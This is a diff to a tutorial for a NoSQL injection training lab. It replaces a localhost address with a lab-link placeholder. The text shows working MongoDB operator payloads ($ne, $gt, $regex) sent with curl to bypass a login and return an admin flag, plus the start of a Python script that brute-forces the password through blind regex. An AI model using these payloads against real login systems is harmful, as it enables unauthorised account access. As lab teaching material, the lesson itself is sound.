@@ -71,7 +71,10 @@ db.users.findOne({ username: "admin", password: { $ne: "invalid" } });
 ```bash
 cd nosql-injection/lab
 docker compose up -d
-# Lab at: http://localhost:7106
+
+> 💡 **Get Lab Link:** Open this lesson on **Learning Detail** → click **"Access Lab"** to get the real link (e.g., `https://vuln.ghedahaui.online/labs-env/...`). Replace `<LAB_ADDRESS>` with that link in commands below.
+
+# Lab at: <LAB_ADDRESS>
 ```
 
 The lab is a login API (Node.js + Express + MongoDB) accepting JSON at `POST /api/login`. The `users` collection holds `admin` (hashed password) and `guest`.
@@ -81,7 +84,7 @@ The lab is a login API (Node.js + Express + MongoDB) accepting JSON at `POST /ap
 ### Step 2: Confirm the app uses JSON
 
 ```bash
-$ curl -s http://localhost:7106/api/login -X POST \
+$ curl -s <LAB_ADDRESS>/api/login -X POST \
        -H "Content-Type: application/json" \
        -d '{"username":"guest","password":"guest123"}'
 {"success":true,"role":"user"}
@@ -94,7 +97,7 @@ $ curl -s http://localhost:7106/api/login -X POST \
 ### Step 3: Bypass with `$ne` — login as admin, no password
 
 ```bash
-$ curl -s http://localhost:7106/api/login -X POST \
+$ curl -s <LAB_ADDRESS>/api/login -X POST \
        -H "Content-Type: application/json" \
        -d '{"username":"admin","password":{"$ne":""}}'
 {"success":true,"role":"admin","flag":"FLAG{n0sql_0p3r4t0r_2026}"}
@@ -108,12 +111,12 @@ $ curl -s http://localhost:7106/api/login -X POST \
 
 ```bash
 # $gt: password > "" (any non-empty string) — same bypass
-$ curl -s http://localhost:7106/api/login -X POST \
+$ curl -s <LAB_ADDRESS>/api/login -X POST \
        -H "Content-Type: application/json" \
        -d '{"username":"admin","password":{"$gt":""}}'
 
 # $regex: password contains the letter a (anything + a + anything)
-$ curl -s http://localhost:7106/api/login -X POST \
+$ curl -s <LAB_ADDRESS>/api/login -X POST \
        -H "Content-Type: application/json" \
        -d '{"username":"admin","password":{"$regex":".*a.*"}}'
 ```
@@ -126,7 +129,7 @@ Just like blind SQLi — ask for each password char:
 
 ```bash
 # First char is 'f'?
-$ curl -s http://localhost:7106/api/login -X POST \
+$ curl -s <LAB_ADDRESS>/api/login -X POST \
        -H "Content-Type: application/json" \
        -d '{"username":"admin","password":{"$regex":"^f"}}'
 ```
@@ -140,7 +143,7 @@ $ curl -s http://localhost:7106/api/login -X POST \
 ```python
 import requests, string
 
-url = "http://localhost:7106/api/login"
+url = "<LAB_ADDRESS>/api/login"
 charset = string.ascii_lowercase + string.digits + "_{}@.-"
 password = ""
 for i in range(1, 40):
